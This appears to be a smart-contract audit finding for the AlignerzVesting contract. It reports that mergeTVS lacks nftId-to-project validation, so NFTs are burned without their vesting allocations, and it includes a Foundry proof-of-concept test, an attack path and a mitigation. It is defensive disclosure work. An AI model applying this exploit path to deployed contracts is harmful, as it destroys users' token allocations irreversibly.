# [000778] Missing Validation in mergeTVS Allows NFT Allocation Loss
  
  ### Summary

Insufficient validation of nftId-to-projectId mapping in the mergeTVS function will cause allocation loss for bidders as an attacker merges an NFT from one project into an unrelated project, resulting in the NFT being burned without its allocations being transferred.


### Root Cause

In `AlignerzVesting.sol:mergeTVS`, there is missing validation that each nftId belongs to the corresponding projectId in the provided arrays. While the function validates that both projectIds use the same token and checks array length matching, it does not verify that nftIds[i] is actually associated with projectIds[i]. This allows an NFT from any project to be burned during the merge process without its allocations being appended to the merged NFT if the allocation array is empty.

[length validation](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L1018)

[token validation](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L1035)

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. A bidder claims an NFT (nftId_A) from PROJECT_ID with valid token allocations
2. The bidder creates a second NFT (nftId_B) from PROJECT_ID+1 with the same token
3. The bidder calls mergeTVS(PROJECT_ID, nftId_A, [PROJECT_ID], [nftId_B]) - passing the wrong projectId for nftId_A
4. The _merge function retrieves the allocation from biddingProjects[PROJECT_ID].allocations[nftId_B], which may be empty or non-existent (defaulting to an empty Allocation struct)
5. Since TVSToMerge.amounts.length is zero, no allocations are appended to mergedTVS
6. nftId_A is burned in the _merge function, destroying all associated vesting allocations
7. The bidder is unable to recover the tokens represented by nftId_A's original allocation


### Impact

The bidder suffers a complete loss of their vesting allocation associated with the burned NFT (approximately BIDDER_USD worth of tokens). The attacker (or any user who mistakenly calls the function) gains nothing directly but causes irreversible loss to the NFT owner through the permanent burn of the NFT without transferring its allocations.


### PoC

```solidity
function generateMerkleProofs2(BidInfo[] memory bids, uint256 poolId, uint256 projectId) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, projectId, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    function test_Merge_Causing_Allocation_Loss_POC() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch bidding projects
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

        vesting.createPool(PROJECT_ID+1, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID+1, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID+1, 4_000_000 ether, 0.03 ether, false);


        // 3. Place bids from different whitelisted users
        vesting.addUserToWhitelist(bidders[0], PROJECT_ID);
        vesting.addUserToWhitelist(bidders[0], PROJECT_ID+1);
        vm.stopPrank();

        usdt.mint(bidders[0], BIDDER_USD);
        vm.startPrank(bidders[0]);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
        usdt.approve(address(vesting), BIDDER_USD);
        vesting.placeBid(PROJECT_ID+1, BIDDER_USD, 90 days);
        vm.stopPrank();

        // 4. Prepare bid allocations (this would be done off-chain), Generate merkle roots, finalize project, claim NFT
        BidInfo[] memory allBids = new BidInfo[](2);
        for (uint256 i = 0; i < 2; i++) {
            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: 60 days,
                poolId: 0,
                accepted: true
            });
        }

        // Generate merkle proofs project 1
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs2(allBids, poolId, PROJECT_ID);
        }

        // Finalize bids project 1
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);

        // Bidder claims NFT for project 1
        uint256[] memory nftIds = new uint256[](2);
        vm.startPrank(bidders[0]);
        uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[bidders[0]]);
        nftIds[0] = nftId;
        vm.stopPrank();

        // Generate merkle proofs project 2
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs2(allBids, poolId, PROJECT_ID + 1);
        }

        // Finalize bids project 2
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID+1, refundRoot, poolRoots, 60);

        // Bidder claims NFT for project 2
        vm.startPrank(bidders[0]);
        uint256 nftId2 = vesting.claimNFT(PROJECT_ID+1, 0, BIDDER_USD, bidderProofs[bidders[0]]);
        nftIds[1] = nftId2;
        vm.stopPrank();

        // 5. User merges NFTs
        uint256[] memory projectIds = new uint256[](1);
        projectIds[0] = PROJECT_ID;
        uint256[] memory nftIdsToMerge = new uint256[](1);
        nftIdsToMerge[0] = nftIds[1];
        vm.prank(bidders[0]);
        uint256 mergedNftId = vesting.mergeTVS(PROJECT_ID, nftIds[0], projectIds, nftIdsToMerge);

        // 6. Fast forward time to simulate vesting period, claiming before vesting is 100% completed
        vm.warp(block.timestamp + 90 days);

        // validate that the second nft got burned, by reverting when trying to claim
        vm.prank(bidders[0]);
        vm.expectRevert();
        vesting.claimTokens(PROJECT_ID + 1, nftIdsToMerge[0]);

        // 7. Users claim tokens after vesting period
        uint256 tokenBalanceBefore = token.balanceOf(bidders[0]);
        vm.startPrank(bidders[0]);
        vesting.claimTokens(PROJECT_ID, mergedNftId);
        uint256 tokenBalanceAfter = token.balanceOf(bidders[0]);
        assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
        vm.stopPrank();
        uint256 bidderTokensClaimed = tokenBalanceAfter - tokenBalanceBefore;

        // !! The bidders token claims are exactly equal to the allocation of 1 NFT.
        assertEq(bidderTokensClaimed, BIDDER_USD);
    }
```

### Mitigation

Add explicit validation in the mergeTVS function to ensure each nftId belongs to the corresponding projectId before processing.
  